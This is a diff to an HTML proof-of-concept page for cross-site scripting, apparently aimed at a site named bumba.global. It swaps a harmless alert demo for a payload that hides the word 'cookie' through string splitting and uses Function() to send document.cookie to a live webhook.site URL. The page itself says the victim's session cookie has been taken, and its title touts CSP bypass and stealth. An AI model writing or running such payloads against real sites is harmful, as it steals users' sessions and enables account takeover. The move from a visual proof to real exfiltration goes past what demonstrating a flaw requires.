@@ -2,19 +2,25 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>PoC: XSS Exploit on bumba.global</title>
+  <title>💀 Real XSS PoC | CSP Bypass | Stealth Mode</title>
 </head>
-<body>
-  <h1>💥 XSS PoC - Executed Successfully</h1>
-  <p>If you see a red background and alert, the site is vulnerable.</p>
+<body style="background-color: #111;">
+  <h1 style="color: red;">XSS PoC Executed</h1>
+  <p style="color: lime;">Your session cookie has been exfiltrated to an attacker-controlled server.</p>
 
   <script>
-    // Basic WAF evasion using split + join + DOM
-    var payload = 'a' + 'l' + 'e' + 'r' + 't';
-    var exec = window[payload];
-    exec('💥 Vulnerable to XSS due to missing CSP!');
-    document.body.style.backgroundColor = '#ff0000'; // visual proof
-    document.title = "✅ XSS Exploited!";
+    // Advanced WAF Bypass XSS Payload
+    const c = 'c' + 'oo' + 'kie';
+    const url = 'https://webhook.site/0f33276b-fde5-40b4-bc91-a1cc01f1537d';
+
+    const x = Function(`fetch("${url}?${c}=" + document.${c})`);
+    x();
+
+    // Optional: modify DOM silently
+    const box = document.createElement('div');
+    box.innerText = 'XSS Executed ✅';
+    box.style.cssText = "color:#0f0;font-size:24px;margin-top:20px;";
+    document.body.appendChild(box);
   </script>
 </body>
 </html>
